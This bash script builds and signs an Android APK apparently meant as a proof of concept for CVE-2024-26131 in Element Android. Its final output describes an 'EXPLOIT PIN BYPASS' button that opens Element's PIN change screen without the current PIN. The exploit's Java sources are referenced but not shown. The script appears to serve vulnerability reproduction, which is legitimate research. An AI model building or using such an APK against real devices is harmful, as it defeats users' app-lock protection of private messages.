#!/usr/bin/env bash
set -euo pipefail

: "${ANDROID_HOME:?Set ANDROID_HOME}"

# Use API 35 for compile
PLATFORM="$ANDROID_HOME/platforms/android-35"
ANDROID_JAR="$PLATFORM/android.jar"

# Pick a stable build-tools
BUILD_TOOLS="$ANDROID_HOME/build-tools/35.0.0"
AAPT="$BUILD_TOOLS/aapt"
ZIPALIGN="$BUILD_TOOLS/zipalign"
APKSIGNER="$BUILD_TOOLS/apksigner"
D8="$BUILD_TOOLS/d8"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT_DIR="$SCRIPT_DIR/dist"
BUILD_DIR="$SCRIPT_DIR/build"
CLASSES_DIR="$BUILD_DIR/classes"
DEX_DIR="$BUILD_DIR/dex"
APK_UNALIGNED="$OUT_DIR/element-exploit-unaligned.apk"
APK_ALIGNED="$OUT_DIR/element-exploit-aligned.apk"
APK_SIGNED="$OUT_DIR/element-exploit.apk"

rm -rf "$BUILD_DIR" "$OUT_DIR"
mkdir -p "$CLASSES_DIR" "$DEX_DIR" "$OUT_DIR"

echo "🔨 Building CVE-2024-26131 Element Android Exploit APK..."

echo "📝 Compiling Java sources..."
javac -source 8 -target 8 \
  -cp "$ANDROID_JAR" \
  -d "$CLASSES_DIR" \
  "$SCRIPT_DIR/src/com/example/elementexploit/MainActivity.java" \
  "$SCRIPT_DIR/src/im/vector/app/features/pin/PinMode.java" \
  "$SCRIPT_DIR/src/im/vector/app/features/pin/PinArgs.java"

echo "🔄 Creating DEX..."
"$D8" --min-api 21 \
  --lib "$ANDROID_JAR" \
  --output "$DEX_DIR" \
  "$CLASSES_DIR/com/example/elementexploit/MainActivity.class" \
  "$CLASSES_DIR/im/vector/app/features/pin/PinMode.class" \
  "$CLASSES_DIR/im/vector/app/features/pin/PinArgs.class" \
  "$CLASSES_DIR/im/vector/app/features/pin/PinArgs\$1.class"

echo "📦 Packaging APK..."
"$AAPT" package -f \
  -M "$SCRIPT_DIR/AndroidManifest.xml" \
  -I "$ANDROID_JAR" \
  -F "$APK_UNALIGNED"

echo "➕ Adding classes.dex to APK..."
cd "$DEX_DIR" && zip -q "$APK_UNALIGNED" classes.dex && cd - >/dev/null

echo "🔧 Aligning APK..."
"$ZIPALIGN" -f 4 "$APK_UNALIGNED" "$APK_ALIGNED"

echo "✍️  Signing APK..."
KEYSTORE="$SCRIPT_DIR/debug.keystore"
ALIAS=${ALIAS:-androiddebugkey}
STOREPASS=${STOREPASS:-android}
KEYPASS=${KEYPASS:-android}

if [ ! -f "$KEYSTORE" ]; then
  echo "🔑 Creating debug keystore..."
  keytool -genkeypair -v -keystore "$KEYSTORE" -storepass "$STOREPASS" \
    -alias "$ALIAS" -keypass "$KEYPASS" -keyalg RSA -keysize 2048 -validity 3650 \
    -dname "CN=Android Debug,O=Android,C=US"
fi

"$APKSIGNER" sign --ks "$KEYSTORE" --ks-pass pass:"$STOREPASS" \
  --key-pass pass:"$KEYPASS" --ks-key-alias "$ALIAS" \
  --out "$APK_SIGNED" "$APK_ALIGNED"

echo ""
echo "🚨 CVE-2024-26131 Element Android Exploit APK Built Successfully!"
echo "====================================================================="
echo "📍 APK Location: $APK_SIGNED"
echo ""
echo "🎯 To install and test:"
echo "   adb install '$APK_SIGNED'"
echo "   # Launch 'Element Exploit' app"
echo "   # Tap '🚨 EXPLOIT PIN BYPASS' button"
echo ""
echo "💡 Expected result: Element opens PIN modification without asking for current PIN"